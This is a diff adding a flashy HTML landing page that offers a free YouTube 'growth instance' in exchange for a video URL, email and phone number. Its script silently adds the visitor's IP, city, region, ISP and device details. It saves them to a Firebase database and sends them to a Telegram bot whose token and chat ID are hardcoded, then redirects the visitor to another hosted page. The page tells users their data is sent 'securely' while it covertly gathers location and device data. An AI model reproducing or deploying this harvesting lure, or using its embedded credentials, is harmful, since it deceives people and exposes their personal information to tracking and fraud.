@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>RoyalDev | Free Instance Portal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background: radial-gradient(circle at top left, #1f1c2c, #928dab);
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+    }
+    .royal-header {
+      background: linear-gradient(90deg, #ff512f, #dd2476);
+      padding: 30px;
+      text-align: center;
+      color: #fff;
+      box-shadow: 0 0 20px rgba(255, 81, 47, 0.4);
+      border-bottom: 4px solid gold;
+    }
+    .royal-header h1 {
+      text-shadow: 0 0 10px gold;
+    }
+    .form-card {
+      background: rgba(255, 255, 255, 0.07);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 40px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      box-shadow: 0 0 50px rgba(255, 215, 0, 0.1);
+      transition: 0.3s;
+    }
+    .form-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 60px rgba(255, 215, 0, 0.25);
+    }
+    input.form-control {
+      border-radius: 12px;
+      border: none;
+      margin-bottom: 20px;
+    }
+    input.form-control:focus {
+      box-shadow: 0 0 15px gold;
+      border: 1px solid gold;
+    }
+    .btn-gold {
+      background: linear-gradient(135deg, #f7971e, #ffd200);
+      color: #000;
+      font-weight: 700;
+      border-radius: 50px;
+      transition: all 0.3s;
+    }
+    .btn-gold:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+    }
+    footer {
+      text-align: center;
+      margin-top: 50px;
+      color: #ccc;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 20px 0;
+    }
+    @keyframes glow {
+      0% { box-shadow: 0 0 10px #ff512f; }
+      50% { box-shadow: 0 0 30px #dd2476; }
+      100% { box-shadow: 0 0 10px #ff512f; }
+    }
+    .glow-border {
+      animation: glow 2s infinite alternate;
+      border: 2px solid transparent;
+      border-image: linear-gradient(45deg, #ff512f, #dd2476) 1;
+    }
+  </style>
+</head>
+<body>
+
+<div class="royal-header">
+  <h1>RoyalDev <span class="text-warning">Free Growth Instance</span></h1>
+  <p>Fill this premium form & start your free growth trigger now!</p>
+</div>
+
+<div class="container my-5">
+  <div class="form-card glow-border shadow-lg">
+    <form id="freeForm">
+      <div class="mb-3">
+        <label for="ytUrl" class="form-label">YouTube Video URL</label>
+        <input type="url" class="form-control" id="ytUrl" placeholder="https://youtube.com/watch?v=..." required>
+      </div>
+      <div class="mb-3">
+        <label for="email" class="form-label">Your Email</label>
+        <input type="email" class="form-control" id="email" placeholder="example@domain.com" required>
+      </div>
+      <div class="mb-3">
+        <label for="phone" class="form-label">Your Mobile Number</label>
+        <input type="tel" class="form-control" id="phone" placeholder="+91 9876543210" required>
+      </div>
+      <button type="submit" class="btn btn-gold w-100">Submit & Start Sharing</button>
+    </form>
+  </div>
+</div>
+
+<footer>
+  <p>Designed with ❤️ by <b>RoyalDev Team</b>. Powering creators globally.</p>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+  import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+  
+  const firebaseConfig = {
+    apiKey: "AIzaSyDV0FGvFOcbNFCyaDsHyirMWFE5s60oK-8",
+    authDomain: "get-good-night.firebaseapp.com",
+    databaseURL: "https://get-good-night-default-rtdb.firebaseio.com",
+    projectId: "get-good-night",
+    storageBucket: "get-good-night.appspot.com",
+    messagingSenderId: "73537901378",
+    appId: "1:73537901378:web:14346af46a52c51a152edb",
+    measurementId: "G-46M9YET5L5"
+  };
+  
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  
+  document.getElementById('freeForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const ytUrl = document.getElementById('ytUrl').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    
+    if (ytUrl && email && phone) {
+      Swal.fire({
+        title: 'Submitting...',
+        html: 'Securely sending your data...',
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+      
+      let ipData = {};
+      try {
+        const ipResponse = await fetch("https://ipapi.co/json");
+        ipData = await ipResponse.json();
+      } catch {
+        ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
+      }
+      
+      const fullData = {
+        youtube_url: ytUrl,
+        email: email,
+        phone: phone,
+        ip: ipData.ip,
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country,
+        isp: ipData.org || "Unknown ISP",
+        device: navigator.userAgent,
+        platform: navigator.platform,
+        date: new Date().toLocaleString()
+      };
+      
+      const ipKey = ipData.ip.replace(/\./g, "_"); // ✅ IP को Key में बदलना
+      
+      // ✅ Firebase में डेटा सेव करना
+      const ipRef = ref(db, `FreeUsersReq/${ipKey}`);
+      const snapshot = await get(ipRef);
+      
+      if (snapshot.exists()) {
+        const existingData = snapshot.val();
+        existingData.requests = existingData.requests || [];
+        existingData.requests.push(fullData);
+        await set(ipRef, existingData);
+      } else {
+        await set(ipRef, {
+          ip: ipData.ip,
+          requests: [fullData]
+        });
+      }
+      
+      // ✅ Telegram में रिपोर्ट भेजना
+      const tgMsg = `
+🔥 <b> 🌟🌟 भाई इसने free.html फ्रॉम भरा अभी 🌟🌟 </b>
+
+📺 <b>YouTube URL:</b> <a href="${ytUrl}">${ytUrl}</a>  
+📧 <b>Email:</b> ${email}  
+📱 <b>Phone:</b> ${phone}  
+
+🌍 <b>IP:</b> ${ipData.ip}  
+🏙 <b>City:</b> ${ipData.city}  
+🌎 <b>Region:</b> ${ipData.region}  
+🇮🇳 <b>Country:</b> ${ipData.country}  
+📡 <b>ISP:</b> ${ipData.org || "Unknown ISP"}  
+
+💻 <b>Device:</b> <code>${navigator.userAgent}</code>  
+🖥 <b>Platform:</b> ${navigator.platform}  
+📅 <b>Date:</b> ${new Date().toLocaleString()}  
+
+━━━━━━━━━━━━━━━━━━━  
+<b>🔥 Powered by: Your Bot Fraind </b>  
+      `;
+      
+      await fetch("https://api.telegram.org/bot7520783495:AAGC9ZZdgGt-dFMhnR3JI2NdVSM1m9jYpYs/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "6320914640",
+          text: tgMsg,
+          parse_mode: "HTML",
+          disable_web_page_preview: false
+        })
+      });
+      
+      Swal.close();
+      Swal.fire({
+        icon: 'success',
+        title: 'Request Submitted!',
+        text: 'Your details were securely logged. Continue now!',
+        confirmButtonText: 'Go Ahead'
+      }).then(() => {
+    
+    setTimeout(()=>{
+      
+      
+      window.location.href = "https://firebasestorage.googleapis.com/v0/b/get-good-night.appspot.com/o/%24_php%25__Ram_share_H_Royal.html?alt=media&token=0e49b12a-e28a-4ff1-a8dc-9a96a4f73176";
+
+    },1000)     
+     
+      });
+      
+    } else {
+      Swal.fire('Error', 'Please fill all fields.', 'error');
+    }
+  });
+</script>
+
+
+
+
+</body>
+</html>
